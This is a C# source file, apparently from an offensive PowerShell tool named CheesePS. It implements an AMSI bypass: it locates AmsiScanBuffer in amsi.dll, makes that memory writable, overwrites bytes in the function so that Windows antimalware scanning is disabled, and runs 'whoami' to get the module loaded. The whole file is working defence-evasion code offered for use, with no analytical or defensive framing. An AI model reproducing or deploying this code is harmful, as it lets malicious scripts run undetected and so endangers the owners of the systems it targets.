using System;
using System.Diagnostics;
using System.Management.Automation;
using System.Runtime.InteropServices;
using System.Threading;

namespace CheesePS
{
    internal class AmsiBypass
    {
        public static int Patch(string amsimodule)
        {
            //Get pointer for the amsi.dll        
            var TargetDLL = NativeMethods.GetModuleHandleA(amsimodule);
            if (TargetDLL == IntPtr.Zero)
            {
                Console.WriteLine($"[-] FAIL: Get Handle to {amsimodule}");
                return 1;
            }

            //Get pointer for the AmsiScanBuffer function
            var AmsiScanBufrPtr = NativeMethods.GetProcAddress(TargetDLL, "AmsiScanBuffer");
            if (AmsiScanBufrPtr == IntPtr.Zero)
            {
                Console.WriteLine("[-] FAIL: Get Handle to AmsiScanBuffer");
                return 1;
            }

            var dwSize = (UIntPtr)4;
            uint oldProtection;

            if (!NativeMethods.VirtualProtect(AmsiScanBufrPtr, dwSize, 0x40, out oldProtection))
            {
                Console.WriteLine("[-] FAIL: Call to VirtualProtect -> Enable Write");
                return 1;
            }

            byte[] Patch = { 0x31, 0xff, 0x90 };

            var unmanagedPointer = Marshal.AllocHGlobal(3);
            Marshal.Copy(Patch, 0, unmanagedPointer, 3);

            NativeMethods.CopyMemory(AmsiScanBufrPtr + 0x001b, unmanagedPointer, 3);

            Console.WriteLine("[+] Success. AmsiScanBuffer Patched!");
            Console.WriteLine("[*] Restoring memory protection...");
            uint newProtection;
            if (!NativeMethods.VirtualProtect(AmsiScanBufrPtr, dwSize, oldProtection, out newProtection))
            {
                Console.WriteLine("[-] FAIL: Call to VirtualProtect -> Disable Write");
                return 1;
            }

            return 0;
        }

        private static void ExecuteDummyCode(PowerShell posh)
        {
            var code = "whoami";
            posh.AddScript(code);
            posh.Invoke();
        }

        private static void Test()
        {
        }

        public static bool InvokeBypass(PowerShell posh)
        {
            var proc = Process.GetCurrentProcess();
            Thread.Sleep(1000);

            ExecuteDummyCode(posh);

            foreach (ProcessModule module in proc.Modules)
                if (module.FileName.Contains("amsi.dll"))
                {
                    Console.WriteLine("   [>] Found AMSI Module: {0}", module.FileName);
                    Patch(module.FileName);
                    return true;
                }

            return false;
        }
    }
}